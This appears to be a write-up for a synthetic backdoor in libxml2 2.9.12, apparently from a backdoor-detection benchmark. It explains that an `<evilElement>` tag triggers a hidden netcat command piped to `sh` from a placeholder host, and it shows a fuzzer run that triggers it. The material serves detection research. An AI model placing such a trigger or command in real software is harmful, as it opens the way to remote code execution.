# Libxml2 2.9.12 backdoor
- **Type**: hidden command
- **Affected versions**: none (synthetic backdoor)


## Backdoor
If the XML file contains the tag `<evilElement>` under specific conditions, it runs the command
`timeout 0.05s nc reverseshell.com 1337 | sh`, in an attempt to execute some remote code.


## Triggering the backdoor
We can use a valid `.xml` file containing the appropriate tag to trigger the backdoor (e.g., with
the _backdoored_ version):
```console
$ ./backdoored/libxml2_xml_reader_for_file_fuzzer < backdoor-trigger.xml
Unknown host
```
The `"Unknown host"` message comes from the fact that the `netcat` command cannot actually connect
to port 1337 of `reverseshell.com`.
